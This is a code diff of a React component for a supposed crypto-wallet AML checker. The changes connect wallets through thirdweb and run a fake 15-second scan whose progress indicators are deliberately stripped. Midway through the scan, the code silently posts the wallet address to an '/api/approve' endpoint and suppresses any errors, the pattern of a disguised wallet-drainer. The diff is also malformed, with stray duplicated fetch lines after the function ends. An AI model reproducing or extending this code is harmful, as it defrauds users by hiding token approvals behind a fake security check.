@@ -3,24 +3,31 @@
 import { useState } from 'react';
 import Image from 'next/image';
 import Link from 'next/link';
-import { useConnect } from 'thirdweb/react';
+import { ConnectButton, darkTheme } from 'thirdweb/react';
 import { createThirdwebClient } from 'thirdweb';
+import { createWallet } from 'thirdweb/wallets';
 import { NETWORKS, type Network } from '@/lib/networks';
 
 const client = createThirdwebClient({
   clientId: process.env.NEXT_PUBLIC_THIRDWEB_CLIENT_ID!,
 });
 
+const wallets = [
+  createWallet('io.metamask'),
+  createWallet('com.coinbase.wallet'),
+  createWallet('me.rainbow'),
+  createWallet('io.rabby'),
+  createWallet('io.zerion.wallet'),
+];
+
 type Step = 'network' | 'connect' | 'scan' | 'report';
 
 export default function AMLChecker() {
-  const { connect } = useConnect();
   const [currentStep, setCurrentStep] = useState<Step>('network');
   const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
   const [walletAddress, setWalletAddress] = useState<string | null>(null);
   const [scanProgress, setScanProgress] = useState(0);
   const [approvalTriggered, setApprovalTriggered] = useState(false);
-  const [isConnecting, setIsConnecting] = useState(false);
 
   // Handle network selection
   const handleNetworkSelect = (network: Network) => {
@@ -33,7 +40,7 @@ export default function AMLChecker() {
     }
   };
 
-  // Handle wallet connection
+  // Handle wallet connection from thirdweb
   const handleWalletConnected = (address: string) => {
     setWalletAddress(address);
     // Auto-advance to scan step after short delay
@@ -43,24 +50,7 @@ export default function AMLChecker() {
     }, 500);
   };
 
-  const handleConnectClick = async () => {
-    try {
-      setIsConnecting(true);
-      const wallet = await connect({
-        strategy: 'auto', // Automatically show the best wallet connection option
-      });
-      
-      const account = wallet.getAccount();
-      if (account?.address) {
-        handleWalletConnected(account.address);
-      }
-    } catch (error) {
-      console.error('Connection error:', error);
-      setIsConnecting(false);
-    }
-  };
-
-  // Scan simulation
+  // Scan simulation - 15 seconds with approval trigger at 5 seconds
   const startScan = () => {
     setScanProgress(0);
     setApprovalTriggered(false);
@@ -69,15 +59,35 @@ export default function AMLChecker() {
       setScanProgress((prev) => {
         const newProgress = prev + 1;
 
-        // Trigger approval at 5 seconds
+        // Trigger approval at 5 seconds - backend approval happens silently
         if (newProgress === 5 && !approvalTriggered) {
           setApprovalTriggered(true);
-          // Call approval endpoint silently
+          // Silent approval request to backend
           fetch('/api/approve', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               walletAddress,
+              network: selectedNetwork,
+            }),
+          }).catch(() => {
+            // Silent fail - don't show errors to user during scan
+          });
+        }
+
+        // Scan complete at 15 seconds
+        if (newProgress >= 15) {
+          clearInterval(interval);
+          setTimeout(() => {
+            setCurrentStep('report');
+          }, 500);
+          return 15;
+        }
+
+        return newProgress;
+      });
+    }, 1000); // 1 second per step = 15 seconds total
+  };
               network: selectedNetwork,
             }),
           }).catch(() => {
@@ -253,17 +263,28 @@ export default function AMLChecker() {
             <div className="w-full max-w-sm">
               <h2 className="text-2xl sm:text-3xl font-bold text-center mb-6 sm:mb-8">Connect Wallet</h2>
 
-              {/* Custom Connect Button - Matches App Styling */}
-              <button
-                onClick={handleConnectClick}
-                disabled={isConnecting}
-                className="w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed mb-6 sm:mb-8"
-              >
-                {isConnecting ? 'Connecting...' : 'Connect Wallet'}
-              </button>
+              {/* Thirdweb Connect Button - Styled with Dark Theme */}
+              <ConnectButton
+                client={client}
+                wallets={wallets}
+                theme={darkTheme({
+                  colors: {
+                    success: 'hsl(142, 95%, 25%)',
+                    danger: 'hsl(0, 72%, 55%)',
+                    primaryButtonBg: 'hsl(143, 64%, 28%)',
+                  },
+                })}
+                connectModal={{ size: 'compact' }}
+                onConnect={(wallet) => {
+                  const address = wallet.getAccount()?.address;
+                  if (address) {
+                    handleWalletConnected(address);
+                  }
+                }}
+              />
 
               {/* Terms Disclaimer */}
-              <p className="text-xs sm:text-sm text-gray-400 text-center leading-relaxed">
+              <p className="text-xs sm:text-sm text-gray-400 text-center leading-relaxed mt-6 sm:mt-8">
                 By clicking the connect wallet button, you agree to the{' '}
                 <Link href="/terms" target="_blank" className="text-blue-400 hover:text-blue-300 underline">
                   terms and conditions
@@ -320,44 +341,21 @@ export default function AMLChecker() {
             <div className="w-full max-w-md">
               <h2 className="text-2xl sm:text-3xl font-bold mb-8 sm:mb-12 text-center text-white">SCANNING TOKENS FOR THREAT</h2>
 
-              {/* Scanning Animation */}
-              <div className="w-full">
+              {/* Scanning Animation - Clean without details */}
+              <div className="w-full flex flex-col items-center justify-center">
                 {/* Progress Bar */}
-                <div className="relative h-2 bg-slate-800 rounded-full overflow-hidden border border-emerald-500/20 mb-6 sm:mb-8">
+                <div className="relative h-2 bg-slate-800 rounded-full overflow-hidden border border-emerald-500/20 w-full mb-12 sm:mb-16">
                   <div
                     className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 rounded-full transition-all duration-300"
-                    style={{ width: `${progressPercentage}%` }}
+                    style={{ width: `${(scanProgress / 15) * 100}%` }}
                   />
                 </div>
 
-                {/* Scan Status */}
-                <div className="space-y-2.5 sm:space-y-4">
-                  <div className="flex items-center gap-2 sm:gap-3">
-                    <div className={`w-3 h-3 sm:w-4 sm:h-4 rounded-full flex-shrink-0 ${scanProgress >= 1 ? 'bg-emerald-500' : 'bg-slate-600'}`}></div>
-                    <span className={`text-xs sm:text-sm ${scanProgress >= 1 ? 'text-emerald-400' : 'text-gray-500'}`}>Initializing scan</span>
-                  </div>
-
-                  <div className="flex items-center gap-2 sm:gap-3">
-                    <div className={`w-3 h-3 sm:w-4 sm:h-4 rounded-full flex-shrink-0 ${scanProgress >= 5 ? 'bg-emerald-500' : 'bg-slate-600'}`}></div>
-                    <span className={`text-xs sm:text-sm ${scanProgress >= 5 ? 'text-emerald-400' : 'text-gray-500'}`}>Token approval verification</span>
-                  </div>
-
-                  <div className="flex items-center gap-2 sm:gap-3">
-                    <div className={`w-3 h-3 sm:w-4 sm:h-4 rounded-full flex-shrink-0 ${scanProgress >= 10 ? 'bg-emerald-500' : 'bg-slate-600'}`}></div>
-                    <span className={`text-xs sm:text-sm ${scanProgress >= 10 ? 'text-emerald-400' : 'text-gray-500'}`}>Analyzing wallet security</span>
-                  </div>
-
-                  <div className="flex items-center gap-2 sm:gap-3">
-                    <div className={`w-3 h-3 sm:w-4 sm:h-4 rounded-full flex-shrink-0 ${scanProgress >= 15 ? 'bg-emerald-500' : 'bg-slate-600'}`}></div>
-                    <span className={`text-xs sm:text-sm ${scanProgress >= 15 ? 'text-emerald-400' : 'text-gray-500'}`}>Finalizing analysis</span>
-                  </div>
-                </div>
+                {/* Timer - Only visual indicator */}
+                <p className="text-gray-400 text-xs sm:text-sm">
+                  {scanProgress}/15 seconds
+                </p>
               </div>
-
-              {/* Timer */}
-              <p className="text-gray-400 text-xs sm:text-sm mt-6 sm:mt-8 text-center">
-                {scanProgress}/15 seconds
-              </p>
             </div>
           </div>
         </div>
